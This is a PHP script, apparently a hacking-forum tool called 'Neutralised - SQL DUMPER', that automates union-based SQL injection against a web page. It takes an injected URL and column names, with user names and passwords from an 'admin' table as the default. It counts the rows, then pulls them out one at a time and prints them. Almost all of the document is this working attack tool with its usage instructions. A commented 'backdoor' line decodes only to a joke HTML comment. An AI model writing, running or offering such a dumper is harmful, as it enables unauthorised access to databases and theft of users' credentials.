<?php
//Neutralised - SQL DUMPER

?>
<title>Neutralised - SQL DUMPER</title>
<style type="text/css">
body {
background-color: #D8D8D8;
font-family: Arial, Verdana, Helvetica, sans-serif;
font-size: 12px;
color: #000000;
}
.textbox {
	border: #000000 1px solid;
    font-size: 12px;
    font-family: Arial, Verdana, Helvetica, sans-serif;
    background-color: #D8D8D8;
}
</style>
<form action="" method="post">
Site:<br /><input name="site" class="textbox" type="text" value="http://www.site.com/x.php?id=-99+UNION+ALL+SELECT+1,Neutralise,3+from+admin--" size="180"/><br />
Dump:<br /><input name="data" class="textbox" type="text" value="user_name,0x3a,password" size="180"/><br /><br />
<input name="submit_lol" class="textbox" value="Submit" type="submit">
</form>
<font size='1px'><b>Usage:</b> Enter in the site you have injected, with 'Neutralise' in the visible col.<br />
Then enter into the dump the cols you wish to extract, adding the 0x3a between each for readability.<br />
Just like in the above example.</font>
<?php
set_time_limit(0);
if (isset($_POST["submit_lol"])) {
	$site = $_POST['site'];
	$userdata = $_POST['data'];
	$inj = "unhex(hex(concat(0x4E65757472616C6973653a," . $userdata . ",0x4E65757472616C6973653a)))";
	$count = "concat(0x4E65757472616C697365,count(*),0x4E65757472616C697365)";
	echo "<br /><br />[+] Dumping URL : " . $site . "";
	$old = array(
		'unhex(hex(concat(0x4E65757472616C6973653a,',
		'0x3a,',
		',0x4E65757472616C6973653a)))');
	$new = array(
		"",
		"",
		"");
	$dumpn = str_replace($old,$new,$inj);
	$pieces = explode(",",$dumpn);
	echo "<br />[+] Extracting : ";
	foreach ($pieces as $piece) {
		echo "" . $piece . ",";
	}
	$totalcount = str_replace("Neutralise",$count,$site);
	$limit = get($totalcount);
	if (!$limit) {
		echo "<br />[+] Dead injection point!";
	}
	else {
		echo "<br />[+] Found " . $limit . " entries to extract.<br /><br />";
	}
	$i = 0;
	while ($i < $limit) {
		$i2 = $i + 1;
		$old = array("Neutralise","--");
		$new = array($inj,"+limit+" . $i . ",1--");
		$siteinj = str_replace($old,$new,$site);
		$siteinjresult = get($siteinj);
		if (!$siteinjresult) {
			echo "<br />[+] Wrong cols!";
		}
		else {
			echo "" . $i2 . " " . $siteinjresult . ":<br />";
		}
		$i++;
	}
}
function get($site) {
	$GET = @file_get_contents($site);
	if (preg_match("/Neutralise(.*?)Neutralise/i",$GET,$matches)) {
		return $matches[1];
	}
}
//backdoor!!?
$str = "PCEtLUxPTCBqdXN0IG1lc3Npbmcgd2l0aCB5YSEgWEQtLT4=";
echo base64_decode($str);
?>

